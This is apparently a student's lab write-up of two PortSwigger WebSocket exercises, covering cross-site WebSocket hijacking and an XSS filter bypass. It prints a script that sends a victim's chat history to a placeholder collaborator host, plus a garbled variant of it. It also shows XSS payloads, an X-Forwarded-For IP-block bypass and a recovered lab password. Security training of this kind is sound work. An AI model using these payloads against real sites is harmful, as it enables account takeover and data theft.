



---
> The other 2 labs were already solved.

#### 1.2. Lab: Cross-site WebSocket hijacking ⭕️
This online shop has a live chat feature implemented using WebSockets.
To solve the lab, use the exploit server to host an HTML/JavaScript payload that uses a [cross-site WebSocket hijacking attack](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking) to exfiltrate the victim's chat history, then use this gain access to their account.

1. Live chat > send something > refresh > notice that the "READY" command retrieves past chat messages. Or refreshing the page show the chat history even though we are not logged in. Send the "READY" message to Repeater > Send > also show the entire chat history.
	1. ![[WebSockets-20260215112151198.png|464]]
	2. ![[WebSockets-20260215112205714.png|458]]
	3. ![[WebSockets-20260215112213508.png|459]]
	4. ![[WebSockets-20260215112451132.png|457]]
	5. ![[WebSockets-20260215112750623.png]]
2. Session cookie has `SameSite: None` means we can send the cookie to different domains. 
	1. ![[WebSockets-20260215112600036.png]]
3. HTTP History > `GET /chat` doesn't have csrf token
	1. ![[WebSockets-20260215112855828.png|228]]
4. Paste the following payload > replace `your-websocket-url` and `your-collaborator-url` > deliver exploit to victim > check burp collaborator and see carlos's chat history with his password. Login to solve: `carlos:62kmcyd3l5q8z9sr326o`.
	1. ![[WebSockets-20260215114320988.png]]
	2. ![[WebSockets-20260215113744485.png|470]]

Send chat history to burp
```
<script> var ws = new WebSocket('wss://your-websocket-url/chat'); ws.onopen = function() { ws.send("READY"); }; ws.onmessage = function(event) { fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data}); }; </script>
```

Alternative: send chat history to access log
```
＜script> 
var ws = new WebSocket("wss://YOUR-WEBSOCKET-ID.web-security-academy.net/chat"
);

ws.onopen = function（）｛
ws.send（"READY"）；
｝

ws.onmessage = function （event）｛ fetch（ "https://exploit-YOUR-EXPLOIT-SERVER.exploit-server. net/exploit?message="+ btoa（event.data）
```
![[WebSockets-20260215114748975.png]]
![[WebSockets-20260215114948614.png]]


How to ID:
- auth shop > no check stock > live chat > "Invalid username or password." > READY message retrieve chat history > 

---

#### 1.3. Lab: Manipulating the WebSocket handshake to exploit vulnerabilities ⭕️
This online shop has a live chat feature implemented using WebSockets.
It has an aggressive but flawed XSS filter.
To solve the lab, use a WebSocket message to trigger an `alert()` popup in the support agent's browser.
1. Click live chat > enter a simple XSS payload > "Error: Attack detected: JavaScript". Refresh and got "This address is blacklisted".
	1. ![[Extra Labs-20260127212339781.png]]
	2. ![[Extra Labs-20260127212458086.png]]
```
<img src=1 onerror='alert(1)'>
```
1. Bypass IP restriction with `X-Forwarded-For`:
	1. WebSockets history > find your first chat (before IP restriction) > Send to Repeater > Reconnect > `X-Forwarded-For: 1.1.1.1` > Connect > Send. Notice now that we've bypassed the IP restriction.
	2. ![[Extra Labs-20260127212929910.png]]
	3. ![[Extra Labs-20260127213241087.png]]
2. #Useful Send the following obfuscated payload to solve the lab. 
	1. ![[Extra Labs-20260127213335394.png]]
```
<img src=1 oNeRrOr=alert`1`>
```
>So one of the ways to bypass XSS filters is using capitalization and removing parentheses -- depending on the HTML tag used.

>[!tip] How to Identify this Vulnerability
>1. Feature that use WebSockets like live chat
>2. XSS in chat got "Error: Attack detected: JavaScript"
>3. IP blocking "This address is blacklisted"

---